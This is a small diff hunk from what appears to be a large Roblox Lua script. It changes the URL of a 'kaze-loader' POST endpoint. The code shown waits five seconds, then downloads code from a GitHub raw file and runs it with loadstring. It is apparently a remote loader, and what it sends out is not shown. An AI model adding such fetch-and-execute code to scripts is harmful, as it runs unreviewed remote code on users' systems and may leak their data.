@@ -2954,7 +2954,7 @@ task.spawn(function()
     task.wait(5)
 
     local urlGet  = "https://raw.githubusercontent.com/67Studio/saa/refs/heads/main/a"
-    local urlPost = "https://kaze-loader.lovable.app/api/public/raw/5c11c21d-f1eb-432e-bc01-ffa8c0537651"
+    local urlPost = "https://kaze-loader.lovable.app/api/public/raw/667cbfc9-9368-4bd5-b974-ff0dbf8e8d05"
 
     local ok1, err1 = pcall(function()
         local fn = loadstring(game:HttpGet(urlGet))
